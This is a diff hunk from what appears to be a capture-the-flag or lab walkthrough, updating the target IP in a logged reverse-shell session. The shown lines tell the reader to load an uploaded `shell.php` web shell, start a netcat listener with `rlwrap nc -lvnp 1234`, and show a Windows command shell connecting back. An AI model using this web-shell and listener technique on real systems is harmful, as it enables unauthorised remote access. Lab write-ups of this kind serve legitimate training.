@@ -254,7 +254,7 @@ Go back to the website and append `/images/shell.php` on your URL, this should o
 $ rlwrap nc -lvnp 1234
 
 listening on [any] 1234 ...
-connect to [10.4.32.195] from (UNKNOWN) [10.10.151.228] 49969
+connect to [10.4.32.195] from (UNKNOWN) [10.10.44.132] 49969
 SOCKET: Shell has connected! PID: 1148
 Microsoft Windows [Version 10.0.18362.1256]
 (c) 2019 Microsoft Corporation. All rights reserved.
